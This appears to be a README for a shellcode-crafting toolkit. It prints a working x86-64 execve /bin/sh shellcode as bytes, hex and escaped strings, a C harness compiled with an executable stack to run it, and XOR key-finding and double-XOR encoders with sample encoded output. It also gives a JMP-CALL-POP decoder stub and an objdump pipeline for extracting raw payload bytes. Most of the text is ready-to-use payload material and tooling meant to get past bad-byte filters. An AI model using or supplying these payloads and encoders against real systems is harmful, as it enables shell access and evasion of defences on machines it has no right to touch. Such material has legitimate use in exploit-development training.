# Usage

## The shellcode python generator

It uses the simplest "execve /bin/sh" shellcode by default

```bash
python3 generate_shellcode.py

Shellcode: b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
Shellcode HEX: 31f65648bb2f62696e2f2f736853545ff7eeb03b0f05
Raw Shellcode: \x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05
Shellcode Length: 22 bytes
```

## The C payload tester

### Compile
`gcc -o test_payload test_payload.c -z execstack`

### Test
```bash
./test_payload               

$ id
uid=1000(xtk)...
```

## XOR key finder

This script helps to avoid specified badbytes by static XOR key encoding. 
It looks for appropriate XOR key to fit specified badbytes

### Usage

```bash
$ python3 xor_key_finder.py

Found valid XOR key: 0x0d
Encoded shellcode:
\x3c\xfb\x5b\x45\xb6\x22\x6f\x64\x63\x22\x22\x7e\x65\x5e\x59\x52\xfa\xe3\xbd\x36\x02\x08
0x3c,0xfb,0x5b,0x45,0xb6,0x22,0x6f,0x64,0x63,0x22,0x22,0x7e,0x65,0x5e,0x59,0x52,0xfa,0xe3,0xbd,0x36,0x02,0x08
3cfb5b45b6226f646322227e655e5952fae3bd360208
...
Found valid XOR key: 0xaa
Encoded shellcode:
\x9b\x5c\xfc\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xfe\xf5\x5d\x44\x1a\x91\xa5\xaf
0x9b,0x5c,0xfc,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xfe,0xf5,0x5d,0x44,0x1a,0x91,0xa5,0xaf
9b5cfce21185c8c3c48585d9c2f9fef55d441a91a5af
...
```

## XOR payload decoder assembly

This assembly decodes XOR endcoded shellcode and uses JMP-CALL-POP technique to dynamically find the address of the payload in a position-independent manner, ensuring the decoder works regardless of where the code is loaded in memory.

### Usage

```bash
nasm -f elf64 -o shellcode.o XOR_decoder.nasm
ld -o shellcode shellcode.o
```

Let's get the RAW payload using:
```bash
objdump -d shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

## Double XOR shellcode encoder

```powershell
PS> ./encoder.ps1
Original shellcode: 0x31,0xf6,0x56,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xf7,0xee,0xb0,0x3b,0x0f,0x05
Encoded shellcode: 0x74,0xb5,0x15,0x0f,0xfe,0x6a,0x29,0x2c,0x2d,0x6a,0x6a,0x36,0x2f,0x16,0x13,0x1a,0xb2,0xad,0xf7,0x7e,0x4a,0x40
Size:  0x16
Contains NULL-bytes: False
```



